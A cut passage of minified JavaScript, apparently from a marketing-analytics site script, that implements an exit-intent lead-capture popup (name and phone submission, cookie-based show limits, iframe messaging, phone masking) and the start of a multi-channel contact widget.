                es("auto");
                eu(true);
                fJ();
              }
            }, gt);
          } else {
            clearTimeout(gg.timeoutId);
            A("LeadHunter: auto show time is not positive, feature disabled");
          }
        };
        var f0 = function () {
          fY.onclick = fK.onclick = fr;
          gk.onclick = e6;
          if (eg(ge)) {
            ef(ge, "click", fi);
          }
          if (eg(fH)) {
            ef(fH, "change", gr);
          }
          var gu = M.getElementsByClassName("roistat-lh-input");
          if (Array.isArray(gu)) {
            for (var gx = 0; gx < gu.length; gx++) {
              ef(gu[gx], "keyup", function (gB) {
                gB = gB || event;
                var gA = gB.keyCode ? gB.keyCode : gB.which;
                if (gA == 13) {
                  e6();
                }
              });
            }
          }
          var gv = cv.onresize;
          cv.onresize = function (gA) {
            if (gv) {
              gv(gA);
            }
            f5(gA);
          };
          if (!e5) {
            var gt = M.onmouseout;
            M.onmouseout = function (gA) {
              if (gt) {
                gt(gA);
              }
              fG(gA);
            };
          }
          if (dV && !d3() && eg(eO)) {
            eO.onmouseover = function () {
              ar(eO, "roistat-lh-pulsator-hover");
            };
            eO.onmouseout = function () {
              ck(eO, "roistat-lh-pulsator-hover");
            };
            eO.onclick = function () {
              fd();
            };
            cv.addEventListener("resize", function gz() {
              if (eg(eO)) {
                eO.style.transform = ec();
              }
            });
            if (d4) {
              eh.addEventListener("resize", function gy() {
                if (eg(eO)) {
                  eO.style.transform = ec();
                }
              });
            }
          }
          var gw = cv.onhashchange;
          cv.onhashchange = function () {
            if (gw) {
              gw.apply(this, arguments);
            }
            er();
          };
        };
        var gj = function () {
          if (dV && !d3() && eg(eO)) {
            eO.onmouseover = function () {
              ar(eO, "roistat-lh-pulsator-hover");
            };
            eO.onmouseout = function () {
              ck(eO, "roistat-lh-pulsator-hover");
            };
            eO.onclick = function () {
              fd();
            };
            cv.addEventListener("resize", function gx() {
              eO.style.transform = ec();
            });
            if (d4) {
              eh.addEventListener("resize", function gw() {
                if (eg(eO)) {
                  eO.style.transform = ec();
                }
              });
            }
          }
          fK.onclick = fr;
          fV = M.getElementById(fg);
          if (eg(fV)) {
            ef(fV, "load", function () {
              eu();
              gf();
            });
          }
          var gu = cv.onresize;
          cv.onresize = function (gy) {
            if (gu) {
              gu(gy);
            }
            f5(gy);
          };
          if (!e5) {
            var gt = M.onmouseout;
            M.onmouseout = function (gy) {
              if (gt) {
                gt(gy);
              }
              if (!ai()) {
                A("ShowLimit: Beta Test off, check cursor usually");
                fG(gy);
              } else {
                A("ShowLimit: Beta Test on, check cursor by caught or max show limit");
                if (!fI() && !eM()) {
                  A("ShowLimit: Check cursor allowed");
                  fG(gy, true);
                }
              }
            };
          }
          var gv = cv.onhashchange;
          cv.onhashchange = function () {
            if (gv) {
              gv.apply(this, arguments);
            }
            er();
          };
        };
        var fq = function (gu) {
          var gt = M.getElementsByClassName(gu);
          if (gt.length > 0) {
            return gt[0];
          } else {
            return null;
          }
        };
        var fn = function () {
          var gw = fq("roistat-lh-title");
          if (eg(gw) && roistat.leadHunter.form.title) {
            gw.innerHTML = roistat.leadHunter.form.title;
          }
          var gu = fq("roistat-lh-sub-title");
          if (eg(gu) && roistat.leadHunter.form.subTitle) {
            gu.innerHTML = roistat.leadHunter.form.subTitle;
          }
          var gv = fq("roistat-lh-thank-you");
          if (eg(gv) && roistat.leadHunter.form.thankYouText) {
            gv.innerHTML = roistat.leadHunter.form.thankYouText;
          }
          var gy = fq("roistat-lh-submit");
          if (eg(gy) && roistat.leadHunter.form.buttonText) {
            gy.value = roistat.leadHunter.form.buttonText;
          }
          var gx = fq("roistat-lh-text-label-name");
          if (eg(gx) && roistat.leadHunter.form.nameLabel) {
            gx.innerHTML = roistat.leadHunter.form.nameLabel;
          }
          var gt = fq("roistat-lh-text-label-contact");
          if (eg(gt) && roistat.leadHunter.form.contactLabel) {
            gt.innerHTML = roistat.leadHunter.form.contactLabel;
          }
        };
        var eK = function (gu, gy, gx) {
          var gt;
          if (!gu) {
            A("LeadHunter: deactivating, empty form");
          } else {
            A("LeadHunter: rendering hidden form");
          }
          fK = M.createElement("div");
          fu = M.createElement("div");
          fu.innerHTML = gu;
          fK.className = e4;
          fu.className = e4;
          A("LeadHunter: processForm, isLeadHunterPulsatorEnabled: " + (dV ? 1 : 0));
          if (gy && dV && gx && !d3()) {
            var gv = typeof gx.position === "string" && gx.position !== "" ? gx.position : "bottomRight";
            gt = M.createElement("div");
            gt.innerHTML = gy;
            eO = gt.childNodes.item(0);
            f1 = eO.childNodes.item(1);
            fo = eO.childNodes.item(2).childNodes.item(0);
            f1.setAttribute("style", "background: " + gx.button.background + ";");
            fo.setAttribute("style", "fill: " + gx.button.color + ";");
            eO.setAttribute("style", "bottom: " + gl[gv].bottom + ";right:" + gl[gv].right + ";");
            eO.style.transformOrigin = gl[gv].transformOrigin;
            eO.style.transform = ec();
            gg.pulsator.previousClass = eO.className;
            eO.className = e4;
            M.body.appendChild(eO);
          }
          M.body.appendChild(fK);
          M.body.appendChild(fu);
          eU = M.getElementById(eV);
          gm = M.getElementById(eH);
          gh = M.getElementById(fm);
          fY = M.getElementById(eo);
          gk = M.getElementById(ep);
          ex = M.getElementById(f8);
          fH = M.getElementById(go);
          ge = M.getElementById(fX);
          fp = M.getElementById(ej);
          ff = M.getElementById(f2);
          eA = M.getElementById(ft);
          var gw = fq(eJ);
          eS = eg(gw) && gw.getAttribute("data-is-iframe");
          if (eS) {
            gj();
          } else {
            fn();
            f0();
            er();
            gf();
          }
        };
        var gi = function (gv) {
          var gu = gv.button && gv.button.background && gv.button.color;
          if (!gu) {
            return;
          }
          cs.setObject(b8, e7);
          var gt = typeof gv.position === "string" && gv.position !== "" ? gv.position : "bottomRight";
          if (eg(f1)) {
            f1.setAttribute("style", "background: " + gv.button.background + ";");
          }
          if (eg(fo)) {
            fo.setAttribute("style", "fill: " + gv.button.color + ";");
          }
          if (eg(eO)) {
            eO.setAttribute("style", "bottom: " + gl[gt].bottom + ";right:" + gl[gt].right + ";");
            eO.style.transformOrigin = gl[gt].transformOrigin;
            eO.style.transform = ec();
          }
        };
        var ey = function () {
          var gt = cs.get(b9),
            gv = cs.get(bD),
            gu = cs.getObject(b8);
          eK(cy.decode(gt), cy.decode(gv), gu);
        };
        var e9 = function () {
          var gu = fu.clientWidth,
            gt = fu.clientHeight;
          if (eg(fu)) {
            fu.setAttribute("style", fu.getAttribute("style") + " width: " + gu + "px; height: " + gt + "px;");
          }
          if (eg(gm)) {
            gm.className = e4;
          }
          if (eg(eU)) {
            eU.className = e4;
          }
          if (eg(ex)) {
            ex.className = e4;
          }
          if (eg(gh)) {
            gh.setAttribute("style", "width: " + gu + "px; height: " + gt + "px; display: table-cell;");
            gh.className = eD;
          }
          setTimeout(function () {
            A("LeadHunter: close form after timeout");
            fr();
          }, 7000);
        };
        var fJ = function () {
          var gu = Math.round((fW() - fu.clientHeight) / 2);
          var gt = Math.round((gs() - fu.clientWidth) / 2);
          if (eg(fu)) {
            fu.setAttribute("style", "left: " + gt + "px; top: " + Math.max(0, gu) + "px;");
          }
        };
        var es = function (gu) {
          if (!bS(cs.get(e8))) {
            return;
          }
          if (cv.roistat.leadHunter.onBeforeAppear) {
            A("LeadHunter: process user defined onBeforeAppear");
            cv.roistat.leadHunter.onBeforeAppear(gu);
            if (eS) {
              fC();
            }
          }
          if (eg(fu)) {
            fu.setAttribute("style", "left:20px;top:-20px;opacity:0");
            fu.className = fl;
          }
          if (eg(fK)) {
            fK.className = fL;
          }
          if (eg(gm)) {
            gm.className = f6;
          }
          if (eg(eU)) {
            eU.className = f9;
          }
          if (eg(ex)) {
            ex.className = fh;
          }
          if (eg(gh)) {
            gh.setAttribute("style", "");
            gh.className = e4;
          }
          if (eg(fK)) {
            fK.setAttribute("style", "opacity:0;");
          }
          eE = true;
          setTimeout(function () {
            fK.setAttribute("style", "opacity:.5;");
          }, 10);
          var gv = j(cl),
            gt = e3 + "?visit_id=" + gv + "&page=" + z();
          X(gt);
          if (cv.roistat.leadHunter.onAfterAppear) {
            A("LeadHunter: process user defined onAfterAppear");
            cv.roistat.leadHunter.onAfterAppear(gv, fK, fu, gm);
            if (eS) {
              fC();
            }
          }
        };
        var fO = function fs() {
          eQ = cz();
          ey();
          A("LeadHunter: form initialized");
        };
        var gf = function fc() {
          A("LeadHunter: tuning appearance for page");
          if (!bS(cs.get(e8)) || cs.get(a3) && !cs.get(ac)) {
            A("LeadHunter: disabled on page");
            gg.leave.isShowEnabled = false;
            clearTimeout(gg.timeoutId);
            if (d3()) {
              dQ = false;
              d0();
            }
            if (eg(eO)) {
              eO.className = e4;
            }
          } else {
            A("LeadHunter: enabled on page");
            if (!fa() && !ai()) {
              A("ShowLimit: Beta Test off, bindShowOnTimeout usually");
              gg.leave.isShowEnabled = true;
              fb();
            }
            if (ai()) {
              A("ShowLimit: Beta Test on, bindShowOnTimeout by caught or max show limit");
              if (!fI() && !eM()) {
                A("ShowLimit: bindShowOnTimeout allowed");
                gg.leave.isShowEnabled = true;
                fb();
              }
            }
            if (eg(eO)) {
              eO.className = gg.pulsator.previousClass;
            }
          }
        };
        var eW = function fF() {
          A("LeadHunter: processing single page application state change");
          eQ = cz();
          gf();
        };
        var fU = function fj() {
          aD(eW);
          var gu = function () {
            var gA = M.querySelector("html"),
              gw = 600,
              gz = 300,
              gC = cv.innerWidth,
              gv = getComputedStyle(gA).zoom,
              gy = {};
            var gx = function () {
              var gD = gA.style.cssText.split(";").find(function (gE) {
                return gE.includes("--zoomLevel");
              });
              if (gD !== bO) {
                gD = gD.split(":");
                if (gD.length > 1) {
                  gD = parseFloat(gD[1]);
                } else {
                  return bO;
                }
              }
              return gD;
            };
            var gB = gx();
            if (gB !== bO) {
              gv = gB;
            }
            if (gC < gw && gC >= gz) {
              gy = {
                isMobileMarkup: true,
                isMobileMarkupXs: false,
                zoomValue: gv
              };
              fV.contentWindow.postMessage({
                sizeSettings: gy,
                message: fM,
                windowWidth: cv.innerWidth || 0
              }, e0);
              return;
            }
            if (gC < gz) {
              gy = {
                isMobileMarkup: false,
                isMobileMarkupXs: true,
                zoomValue: gv
              };
              fV.contentWindow.postMessage({
                sizeSettings: gy,
                message: fM,
                windowWidth: cv.innerWidth || 0
              }, e0);
              return;
            }
            gy = {
              isMobileMarkup: false,
              isMobileMarkupXs: false,
              zoomValue: gv
            };
            fV.contentWindow.postMessage({
              sizeSettings: gy,
              message: fM,
              windowWidth: cv.innerWidth || 0
            }, e0);
          };
          cv.roistatLeadHunterUpdate = gu;
          am(cv, "load", function () {
            gu();
          });
          am(cv, "resize", function () {
            gu();
          });
          am(cv, "message", function gt(gz) {
            var gE = typeof gz.data === "string" ? gz.data : gz.data.message;
            if (gE === fN) {
              f4 = gz.data.scriptId;
              eX = gz.data.showsLimit;
              var gD = cs.getObject(s) !== null;
              if (gD) {
                eP = gz.data.leadHunterAutoShowTime;
                gd = gz.data.leadHunterMinTime;
                e7 = gz.data.leadHunterPulsatorSettings;
                cs.set(fD, gd);
                cs.set(eZ, eP);
                if (e7) {
                  var gC = Number(e7.isEnabled);
                  A("Leadhunter: set pulsator setting " + gC);
                  cs.set(fA, gC);
                  gi(e7);
                }
              }
              A("ShowLimit: Get lhScriptId: " + gz.data.leadHunterId + " and lhScriptMaxShownCount: " + gz.data.leadHunterMaxShownCount + " from lh widget");
              fz();
            }
            if (gE === eI) {
              fr();
            }
            if (gE === fM) {
              const gy = typeof gz.data === "object" && gz.data.calibratingSize !== bO ? gz.data.calibratingSize : true;
              fV.setAttribute("style", "width: " + gz.data.width + "px !important; height: " + gz.data.height + "px !important;");
              if (gn && !gy) {
                fV.contentWindow.postMessage({
                  message: fM,
                  windowWidth: cv.innerWidth || 0,
                  calibratingSize: true
                }, e0);
              }
              f5(gz);
            }
            if (gE === f3) {
              var gx = gz.data.caughtLeadData;
              if (cv.roistat.leadHunter.onBeforeSubmit) {
                A("LeadHunter: process user defined onBeforeSubmit");
                var gv = cv.roistat.leadHunter.onBeforeSubmit(gx);
                if (gv) {
                  gx = gv;
                }
              }
              if (!ai()) {
                A("ShowLimit: Beta Test off, catch before submit message, setCookieLeadHunterCaught will run");
                ev();
              } else {
                A("ShowLimit: Beta Test on, catch before submit message, setLeadHunterScriptCaught will run");
                fB();
              }
              var gw = cs.getObject(cK);
              var gB = gw !== null;
              var gA = gB && gx.isNeedCallback === null && !Q(gw);
              if (gA) {
                gx.isNeedCallback = 0;
              }
              fV.contentWindow.postMessage({
                caughtLead: gx,
                message: fx
              }, e0);
            }
            if (gE === gb) {
              if (cv.roistat.leadHunter.onAfterSubmit) {
                A("LeadHunter: process user defined onAfterSubmit");
                cv.roistat.leadHunter.onAfterSubmit({
                  name: gz.data.name,
                  phone: gz.data.phone
                });
              }
            }
          });
        };
        function fC() {
          var gt = {
            apiData: cv.roistat.leadHunter.form,
            message: fQ
          };
          fV.contentWindow.postMessage(gt, e0);
        }
        function fz() {
          if (!fP()) {
            A("checkLeadHunterLaunch false");
            return;
          }
          var gt = cs.getObject(s) !== null;
          if (gt) {
            ew();
          }
          if (!e2()) {
            A("initSettings false");
            return;
          }
          A("LeadHunter: activated");
          fO();
          gf();
          fU();
          if (typeof cv.onRoistatLeadHunterInited === "function") {
            cv.onRoistatLeadHunterInited();
          }
        }
        function fW() {
          return cv.innerHeight ? cv.innerHeight : M.documentElement.clientHeight == 0 ? M.body.clientHeight : M.documentElement.clientHeight;
        }
        function gs() {
          return cv.innerWidth ? cv.innerWidth : M.documentElement.clientWidth == 0 ? M.body.clientWidth : M.documentElement.clientWidth;
        }
        function fG(gw, gt) {
          gw = gw || event;
          eR = gw.clientY;
          var gu = eR / fW(),
            gy = eL > 0 && eL > gu,
            gv = gu < eN,
            gx = cz() - eQ > gd * 1000;
          if (gy && gv && !eE && gx && gg.leave.isShowEnabled && !fa()) {
            A("LeadHunter: show modal with because move up (" + eL + " -> " + gu + ") and in modal zone and show on leave enabled");
            es("exit");
            eu(gt);
            fk(gw);
          }
          if (gu < eB) {
            eL = gu;
          }
        }
        function f5(gt) {
          if (et) {
            fJ();
          } else {
            gt = gt || event;
            fk(gt);
          }
        }
        function fk(gy) {
          var gu = gy.type === "message" ? gy.data.width : fu.offsetWidth;
          var gv = gs();
          var gt = gy.clientX - Math.round(gu / 2) || fu.offsetLeft;
          gt = Math.max(20, Math.min(gt, gv - gu - 20));
          var gz = gt + gu > gv - 40;
          if (gz) {
            var gw = gt + gu - 20 - (gv - 40);
            gt = gt - gw;
          }
          var gx = gv - 40 > gu ? "" : "width: " + (gu - 40) + "px;";
          if (eg(fu)) {
            fu.setAttribute("style", "left: " + gt + "px; top: 0px; " + gx);
          }
        }
        function ev() {
          cv.roistatSetCookie(eC, 1, c7);
        }
        function fr() {
          if (!ai()) {
            A("ShowLimit: Beta Test off, setCookieLeadHunterCaught");
            ev();
          }
          if (eg(fK)) {
            fK.setAttribute("style", "opacity:0");
          }
          if (eg(fu)) {
            fu.style.top = "-" + fu.offsetHeight * 2 + "px";
            setTimeout(function () {
              fu.className = fK.className = e4;
            }, 500);
          }
        }
        function e6() {
          var gH = M.getElementById("roistat-lh-phone-input"),
            gv = M.getElementById("roistat-lh-name-input"),
            gx,
            gF;
          gx = gH === null ? "" : gH.value;
          gF = gv === null ? "" : gv.value;
          var gC = {
            name: gF,
            phone: gx,
            isNeedCallback: null,
            callbackPhone: null,
            fields: {}
          };
          if (cv.roistat.leadHunter.onBeforeSubmit) {
            A("LeadHunter: process user defined onBeforeSubmit");
            var gy = cv.roistat.leadHunter.onBeforeSubmit(gC);
            if (gy) {
              gC = gy;
            }
          }
          var gE = gC.phone.length < 1;
          var gG = gC.phone.indexOf("_") === -1;
          var gA = !gE && gG;
          var gD = gC.name.length < 1;
          var gu = !gD || !cv.roistat.leadHunter.form.isNameRequired;
          if (!gA && eg(gH)) {
            gH.setAttribute("style", "border: 2px solid #E0571A;");
            return;
          }
          if (!gu && eg(gv)) {
            gv.setAttribute("style", "border: 2px solid #E0571A;");
            return;
          }
          var gt = em + "?v=" + ab + "&lead-hunt-input=" + encodeURIComponent(gC.phone) + "&lead-name=" + encodeURIComponent(gC.name) + "&visit=" + cM();
          if (gC.isNeedCallback !== null && gC.isNeedCallback !== bO) {
            gt = gt + "&is_need_callback=" + (gC.isNeedCallback > 0 ? 1 : 0);
          }
          if (gC.callbackPhone) {
            gt = gt + "&callback_phone=" + gC.callbackPhone;
          }
          if (cv.roistat.leadHunter.additionalNotifyEmail !== null) {
            gt = gt + "&additional_email=" + encodeURIComponent(cv.roistat.leadHunter.additionalNotifyEmail);
          }
          var gw = 0;
          if (gC.fields && typeof gC.fields === "object") {
            for (var gz in gC.fields) {
              if (gC.fields.hasOwnProperty(gz)) {
                ++gw;
              }
            }
          }
          if (gw > 0) {
            gt = gt + "&fields=" + ga(JSON.stringify(gC.fields));
          }
          gt = gt + "&t=" + cz();
          var gB = M.createElement("img");
          gB.src = gt;
          if (eg(gH)) {
            gH.setAttribute("style", "");
          }
          if (!ai()) {
            A("ShowLimit: Beta Test off, caught LH usually");
            ev();
          } else {
            A("ShowLimit: Beta Test on, caught LH by set setLeadHunterScriptCaught");
            fB();
          }
          if (!eg(gh)) {
            fr();
            e1();
          } else {
            e9();
          }
          if (cv.roistat.leadHunter.onAfterSubmit) {
            A("LeadHunter: process user defined onAfterSubmit");
            cv.roistat.leadHunter.onAfterSubmit({
              name: gF,
              phone: gx
            });
          }
        }
        function fi(gt) {
          if (gt.preventDefault) {
            gt.preventDefault();
          } else {
            gt.returnValue = false;
          }
          if (eg(fp)) {
            fp.style.display === "block" ? fp.style.display = "none" : fp.setAttribute("style", "display: block; padding: 0 30px; width:" + fu.clientWidth + "px;");
          }
          f5();
        }
        function gr() {
          if (eg(gk)) {
            gk.disabled === true ? gk.disabled = false : gk.disabled = true;
          }
          if (eg(ff)) {
            ff.style.display === "block" ? ff.style.display = "none" : ff.style.display = "block";
          }
        }
        function e1() {
          M.onmousemove = null;
          if (eg(fK)) {
            fK.onresize = null;
          }
        }
        var eY = function (gz, gC) {
          if (!gz || !gC) {
            A("LeadHunter: skip phone mask render due to empty input or mask");
            return;
          }
          A("LeadHunter: render phone mask " + gC + " for input: " + gz.value);
          if (cv.roistatRenderPhoneMaskMutex) {
            return;
          }
          cv.roistatRenderPhoneMaskMutex = true;
          var gw = "_",
            gv = "x",
            gy = "х",
            gx = gC.toLowerCase().split(gv).join(gw).split(gy).join(gw);
          var gu = function (gD) {
            if (gz.setSelectionRange) {
              gz.setSelectionRange(gD, gD);
            } else {
              if (gz.createTextRange) {
                var gE = gz.createTextRange();
                gE.collapse(true);
                gE.moveEnd("character", gD);
                gE.moveStart("character", gD);
                gE.select();
              }
            }
          };
          var gA = function (gD) {
            if (!gD) {
              return 0;
            }
            var gE = gD.indexOf(gw);
            if (gE < 0) {
              return gD.length;
            }
            return gE;
          };
          var gB = function (gD) {
            gu(gA(gD));
          };
          var gt = function (gM) {
            var gN = gx.split("");
            if (!gM) {
              return gx;
            }
            var gD = gM.split("");
            var gO = [],
              gL,
              gI,
              gK,
              gH,
              gF,
              gE,
              gJ;
            for (var gG = 0; gG < gN.length; gG++) {
              gI = gN[gG];
              if (gG >= gD.length) {
                gO.push(gI);
                continue;
              }
              gF = gG + 1 < gN.length ? gN[gG + 1] : null;
              gE = gG + 1 < gD.length ? gD[gG + 1] : null;
              gJ = gG + 2 < gD.length ? gD[gG + 2] : null;
              gL = gD[gG];
              gK = parseInt(gL) >= 0;
              gH = gI === gw && gK;
              if (!gH) {
                gO.push(gI);
                continue;
              }
              if (gE === gw && gF !== gw && gJ !== gF) {
                gO.push(gI);
                continue;
              }
              gO.push(gL);
            }
            return gO.join("");
          };
          setTimeout(function () {
            var gD = gt(gz.value);
            if (gz.value !== gD) {
              gz.value = gD;
            }
            gB(gD);
            cv.roistatRenderPhoneMaskMutex = false;
          }, 1);
        };
        var fT = function (gt, gv, gu) {
          cs.set(b9, cy.encode(gt));
          cs.set(bD, cy.encode(gv));
          cs.setObject(b8, gu);
        };
        var fy = function (gt) {
          al = gt;
          if (fV === bO) {
            return;
          }
          ek();
        };
        var ek = function () {
          var gt = {
            language: al,
            message: fR
          };
          fV.contentWindow.postMessage(gt, e0);
        };
        var fB = function () {
          A("ShowLimit: Start set roistat_leadHunterScriptsCaught");
          var gt = eF(eT);
          if (!gt) {
            gt = {};
          }
          A("ShowLimit: Cookie roistat_leadHunterScriptsCaught for lhScriptId set to 1");
          gt[f4] = 1;
          fS(eT, gt);
        };
        var en = function () {
          A("ShowLimit: Start set roistat_leadHunterScriptsShownCount");
          var gu = eF(gp);
          if (!gu) {
            gu = {};
          }
          var gv = gu.hasOwnProperty(f4);
          if (!gv) {
            A("ShowLimit: Cookie roistat_leadHunterScriptsShownCount for lhScriptId initialized");
            gu[f4] = 0;
          }
          var gt = gu[f4] + 1 > eX;
          if (gt) {
            A("ShowLimit: Stored lhScriptId has reached lhScriptMaxShownCount, show counter in cookie not rise up, return from function");
            return;
          }
          A("ShowLimit: Cookie already has, exist lhScriptId show counter rise up");
          gu[f4] += 1;
          fS(gp, gu);
        };
        var fS = function (gt, gu) {
          dA(gt, JSON.stringify(gu), c7);
        };
        var eF = function (gt) {
          var gu = j(gt);
          if (typeof gu !== "undefined") {
            return JSON.parse(gu);
          }
          return gu;
        };
        var eM = function () {
          if (eX === 0) {
            A("ShowLimit: show limit off and set to 0");
            return false;
          }
          var gt = eF(gp),
            gu = gt ? gt[f4] : null,
            gv = gu + 1 > eX;
          A("ShowLimit: Check isCurrentScriptMaxShownCountReached, show limit on, check for exceeding the limit, is " + gv);
          return gv;
        };
        var fI = function () {
          var gv = eF(eT),
            gt = gv ? gv[f4] : null,
            gu = gt === 1;
          A("ShowLimit: Check isCurrentLeadHunterScriptSubmitted, is " + gu);
          return gu;
        };
        var ew = function () {
          cs.set(a3, eq());
          cs.set(b9, cy.encode(fE()));
          cs.set(e8, eG());
          cs.set(fA, gq());
        };
        var fE = function () {
          var gt = bi() + "//" + x + "/api/site/1.0/" + bd() + "/leadhunter/script/" + cs.get(a3) + "/widget?visit_id=" + p();
          return '<div class="roistat-lh-popup-wrapper" data-is-iframe="1"><iframe id="roistat-lh-popup-iframe" class="roistat-lh-popup-iframe" src="' + gt + '" frameborder="0"></iframe></div>';
        };
        var eq = function () {
          var gu = cs.getObject(s);
          if (gu === null) {
            return;
          }
          cs.set(ac, "");
          var gy = Number(cs.get(bP));
          var gC = Object.keys(gu);
          var gz = gC.sort()[0];
          if (!gy) {
            return gz;
          }
          for (var gx = 0; gx < gC.length; gx++) {
            var gD = gu[gC[gx]];
            var gA = gD.targetPageList;
            var gw = bS(gA.join(","));
            var gv = gA.length === 0;
            var gt = Array.isArray(gD.devicesFilter) && gD.devicesFilter.length > 0 ? gD.devicesFilter.indexOf(H()) !== -1 : true;
            var gB = (gv || gw) && gt && (!gD.timetable.isEnabled || Q(gD.timetable));
            if (gB) {
              gz = gC[gx];
              cs.set(ac, gz);
            }
          }
          return gz;
        };
        var eG = function () {
          var gt = fv();
          return gt !== null ? gt.targetPageList.join(",") : "";
        };
        var gq = function () {
          var gt = fv();
          return gt !== null ? Number(gt.isPulsatorEnabled) : 0;
        };
        var fv = function () {
          var gt = cs.get(a3);
          var gu = cs.getObject(s);
          return gu[gt] !== null ? gu[gt] : null;
        };
        cv.roistatLeadHunterShow = fd;
        cv.roistatRenderPhoneMask = eY;
        cv.roistat.leadHunter.localization.translateToRussian = function () {
          fy(cp);
        };
        cv.roistat.leadHunter.localization.translateToEnglish = function () {
          fy(aC);
        };
        cL(fz);
      },
      multiwidget: function () {
        var eZ = "roistat-multiwidget-hidden",
          e9 = "roistat-multiwidget-pulsator-phone",
          e7 = "roistat-multiwidget-pulsator-popup-item-lead-hunter",
          eA = "roistat-multiwidget-pulsator-fill",
          fc = "roistat-multiwidget-pulsator-fill-svg",
          eQ = "roistat-multiwidget-pulsator-img-icon",
          ez = "roistat-multiwidget-pulsator-popup-item-chat",
          em = "roistat-multiwidget-pulsator-popup-item-facebook",
          er = "roistat-multiwidget-pulsator-popup-item-vk",
          eP = "roistat-multiwidget-pulsator-popup-item-telegram",
          eG = "roistat-multiwidget-pulsator-popup-item-whats-app",
          eE = "roistat-multiwidget-pulsator-popup-item-viber",
          eU = "roistat-multiwidget-pulsator-items-popup-holder",
          eO = "iframe_chat_successfully_loaded",
          et = "roistat-multiwidget-pulsator-popup-tail",
          eM = "roistat-online-chat-popup-wrapper",
          fb = "roistat-online-chat-popup-wrapper-hidden",
          e5 = "roistat-multiwidget-pulsator-holder-hidden";
        var ey, eT, eH, e8, ej, ep, fa, eL, ev, el, ew, en, e1, eo;
        var eD = false;
        var e6 = {
          topLeft: {
            bottom: "unset",
            right: "unset",
            top: dJ() ? 0 : "20px",
            left: dJ() ? 0 : "35px",
            transformOrigin: "top left"
          },
          topRight: {
            bottom: "unset",
            right: dJ() ? 0 : "35px",
            top: dJ() ? 0 : "20px",
            left: "unset",
            transformOrigin: "top right"
          },
          bottomRight: {
            bottom: dJ() ? 0 : "20px",
            right: dJ() ? 0 : "35px",
            top: "unset",
            left: "unset",
            transformOrigin: "bottom right"
          },
          bottomLeft: {
            bottom: dJ() ? 0 : "20px",
            right: "unset",
            top: "unset",
            left: dJ() ? 0 : "35px",
            transformOrigin: "bottom left"
          }
        };
        var es = {
          topLeft: {
            bottom: "unset",
            right: "unset",
            top: "110px",
            left: "0"
          },
          topRight: {
            bottom: "unset",
            right: "0",
            top: "110px",
            left: "unset"
          },
          bottomRight: {
            bottom: "110px",
            right: "0",
            top: "unset",
            left: "unset"
          },
          bottomLeft: {
            bottom: "110px",
            right: "unset",
            top: "unset",
            left: "0"
          }
        };
        var eF = {
          topLeft: {
            "border-top-color": "white",
            "border-right-color": "transparent",
            "border-bottom-color": "transparent",
            "border-left-color": "white",
            bottom: "unset",
            right: "unset",
            top: "-14px",
            left: "40px"
          },
          topRight: {
            "border-top-color": "white",
            "border-right-color": "transparent",
            "border-bottom-color": "transparent",
            "border-left-color": "white",
            bottom: "unset",
            right: "34px",
            top: "-14px",
            left: "unset"
          },
          bottomRight: {
            "border-top-color": "transparent",
            "border-right-color": "white",
            "border-bottom-color": "white",
            "border-left-color": "transparent",
            bottom: "-14px",
            right: "40px",
            top: "unset",
            left: "unset"
          },
          bottomLeft: {
            "border-top-color": "transparent",
            "border-right-color": "white",
            "border-bottom-color": "white",
            "border-left-color": "transparent",
            bottom: "-14px",
            right: "unset",
            top: "unset",
            left: "34px"
          }
        };
        function eY(fe) {
          A("Multiwidget: " + fe);
        }
        function eN() {
          eT = d7(ey, e9);
          eH = d7(ey, eU);
          e8 = d7(ey, et);
          eL = d7(eH, e7);
          ev = d7(eH, ez);
          el = d7(eH, er);
          ew = d7(eH, em);
          en = d7(eH, eP);
          e1 = d7(eH, eG);
          eo = d7(eH, eE);
          ej = d7(eT, eA);
          ep = eT.getElementsByClassName(fc);
          fa = d7(eT, eQ);
        }
        function eB() {
          if (eg(eH)) {
            eH.classList.toggle(eZ);
          }
        }
        function e4(fe) {
          if (eg(fe)) {
            fe.classList.toggle("opened");
          }
        }
        function fd() {
          eY("add pulsator events");
          ef(eT, "click", function () {
            if (!eJ()) {
              eB();
            }
            e4(eT);
          });
          ef(eL, "click", function () {
            eY("opening leadhunter via multiwidget");
            cv.roistatLeadHunterShow();
            eB();
            dW(eT, "opened", false);
          });
          ef(ev, "click", function () {
            eY("opening online chat via multiwidget");
            cv.roistatOnlineChatShow();
            eB();
          });
          ef(el, "click", function () {
            cv.open(cs.get(c2), "_blank");
          });
          ef(ew, "click", function () {
            cv.open(cs.get(dl), "_blank");
          });
          ef(en, "click", function () {
            cv.open(cs.get(by), "_blank");
          });
          ef(e1, "click", function () {
            cv.open(cs.get(bN), "_blank");
          });
          ef(eo, "click", function () {
            cv.open(cs.get(cQ), "_blank");
          });
        }
        function eJ() {
          var fe = d7(M, eM);
          return eg(fe) && !fe.classList.contains(fb);
        }
        function eK() {
          return eg(eU) && !eU.classList.contains(eZ);
        }
        function eq(fe) {
          if (eg(fe)) {
            fe.classList.add(eZ);
          }
        }
        function eW(fe) {
          if (eg(fe)) {
            fe.classList.remove(eZ);
          }
        }
        function eR() {
          eq(eL);
        }
        function eI() {
          eY("hiding disabled multiwidget options");
          var fe = Number(cs.get(bP)),
            ff = Number(cs.get(cb)),
            fh = Number(cs.get(U)),
            fj = Number(cs.get(cN)),
            fg = Number(cs.get(cY)),
            fi = Number(cs.get(dP));
          if (!fe || !dV || !dQ) {
            eY("hiding leadhunter option");
            eR();
          }
          if (!dZ() || !eD) {
            eY("hiding online chat option");
            eq(ev);
          }
          if (!ff) {
            eY("hiding vk-messenger option");
            eq(el);
          }
          if (!fh) {
            eY("hiding fb-messenger option");
            eq(ew);
          }
          if (!fj) {
            eY("hiding telegram-messenger option");
            eq(en);
          }
          if (!fg) {
            eY("hiding whatsApp-messenger option");
            eq(e1);
          }
          if (!fi) {
            eY("hiding Viber-messenger option");
            eq(eo);
          }
        }
        function ek() {
          var ff = cs.getObject(f);
          eY("start filling pulsator");
          if (ff) {
            if (eg(ej)) {
              ej.setAttribute("style", "background: " + ff.button_color + ";");
            }
            if (eg(fa)) {
              fa.setAttribute("style", "fill: " + ff.icon_color + ";");
            }
            if (HTMLCollection.prototype.isPrototypeOf(ep)) {
              for (var fe = 0; fe < ep.length; fe++) {
                ep[fe].setAttribute("style", "fill: " + ff.button_color + ";");
              }
            }
          }
        }
        function eV() {
          var fe = cs.getObject(f);
          return typeof fe.position === "string" && fe.position !== "" ? fe.position : "bottomRight";
        }
        function eS() {
          if (eg(ey)) {
            var fe = eV();
